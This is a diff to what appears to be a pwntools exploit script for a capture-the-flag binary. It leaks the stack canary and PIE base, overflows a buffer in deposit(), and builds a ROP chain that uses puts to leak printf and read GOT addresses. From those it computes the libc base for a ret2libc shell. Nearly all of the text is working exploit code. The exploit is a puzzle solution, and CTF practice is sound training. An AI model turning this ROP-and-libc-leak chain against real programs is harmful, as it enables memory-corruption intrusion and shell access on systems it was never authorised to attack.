@@ -35,12 +35,9 @@ def main():
     
     log.success(f"Canary: {hex(canary)}")
     log.success(f"PIE: {hex(exe.address)}")
-    log.success(f"saved_rbp: {hex(saved_rbp)}")
+    log.success(f"RBP: {hex(saved_rbp)}")
 
-    # Leak Libc:
-    # Exploit the buffer overflow vulnerability in deposit() to overwrite the return address.
-    # We use a ROP chain to call puts(printf@GOT), which prints the actual memory address of printf in libc.
-    
+    # Leak 2 functions (printf and read) to identify the Libc version on libc.rip
     r.sendlineafter(b"> ", b"3")
     
     rop = ROP(exe)
@@ -49,12 +46,20 @@ def main():
     
     payload = b"A" * 72
     payload += p64(canary)
-    payload += b"B" * 8
+    payload += b"B" * 8 # Dummy saved_rbp to avoid \x7f (DEL) byte in PTY
     payload += p64(ret)
+
+    # Gadget to call puts(printf@GOT)
     payload += p64(pop_rdi)
     payload += p64(exe.got['printf'])
     payload += p64(exe.plt['puts'])
-    payload += p64(exe.address + 0x1448)
+
+    # Gadget to call puts(read@GOT)
+    payload += p64(pop_rdi)
+    payload += p64(exe.got['read'])
+    payload += p64(exe.plt['puts'])
+
+    payload += p64(exe.address + 0x1448) # Return to deposit()
 
     payload_escaped = b"".join(bytes([0x16, b]) for b in payload)
 
@@ -66,6 +71,11 @@ def main():
     printf_leak = u64(leak_line.ljust(8, b"\x00"))
     log.success(f"LEAKED printf@GLIBC: {hex(printf_leak)}")
 
+    # Read leaked read address
+    leak_line2 = r.recvline().strip()
+    read_leak = u64(leak_line2.ljust(8, b"\x00"))
+    log.success(f"LEAKED read@GLIBC: {hex(read_leak)}")
+
     # At this step, the player will copy the address above to https://libc.rip/ and find the 3 offsets below:
 
     LIBC_OFFSET_PRINTF = 0x64080  
@@ -73,7 +83,7 @@ def main():
     LIBC_OFFSET_BINSH  = 0x1db799 
 
     libc_base = printf_leak - LIBC_OFFSET_PRINTF
-    log.success(f"Calculated Libc Base: {hex(libc_base)}")
+    log.success(f"Libc base: {hex(libc_base)}")
 
     # Ret2libc -> Ret2shellcode
     ret = rop.find_gadget(['ret'])[0] 
